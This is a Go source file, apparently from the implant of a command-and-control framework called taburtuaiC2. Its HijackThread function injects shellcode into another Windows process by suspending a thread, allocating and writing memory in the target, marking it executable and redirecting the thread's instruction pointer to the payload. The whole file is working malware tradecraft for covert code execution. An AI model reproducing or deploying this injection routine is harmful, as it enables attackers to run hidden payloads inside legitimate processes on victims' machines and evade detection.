//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// HijackThread suspends the first thread of pid, redirects its RIP to shellcode, then resumes.
func HijackThread(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	tids, err := ProcessThreadIDs(pid)
	if err != nil || len(tids) == 0 {
		return fmt.Errorf("no threads found in PID %d", pid)
	}
	tid := tids[0]

	hThread, _, e := winsyscall.ProcOpenThread.Call(uintptr(winsyscall.ThreadAllAccess), 0, uintptr(tid))
	if hThread == 0 {
		return fmt.Errorf("OpenThread(%d): %v", tid, e)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	r, _, e := winsyscall.ProcSuspendThread.Call(hThread)
	if r == ^uintptr(0) {
		return fmt.Errorf("SuspendThread: %v", e)
	}

	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	addr, _, e := winsyscall.ProcVirtualAllocEx.Call(
		uintptr(hProc), 0, uintptr(len(shellcode)),
		uintptr(winsyscall.MemCommit|winsyscall.MemReserve),
		uintptr(winsyscall.PageReadWrite),
	)
	if addr == 0 {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("VirtualAllocEx: %v", e)
	}

	var written uintptr
	r, _, e = winsyscall.ProcWriteProcessMemory.Call(
		uintptr(hProc), addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&written)),
	)
	if r == 0 {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("WriteProcessMemory: %v", e)
	}

	if _, err := winsyscall.NtProtect(hProc, addr, uintptr(len(shellcode)), winsyscall.PageExecRead); err != nil {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	ctx := newContext()
	ctx.setContextFlags(contextAll)
	r, _, e = winsyscall.ProcGetThreadContext.Call(hThread, ctx.raw())
	if r == 0 {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.setRip(uint64(addr))
	r, _, e = winsyscall.ProcSetThreadContext.Call(hThread, ctx.raw())
	if r == 0 {
		winsyscall.ProcResumeThread.Call(hThread)
		return fmt.Errorf("SetThreadContext: %v", e)
	}

	winsyscall.ProcResumeThread.Call(hThread)
	return nil
}
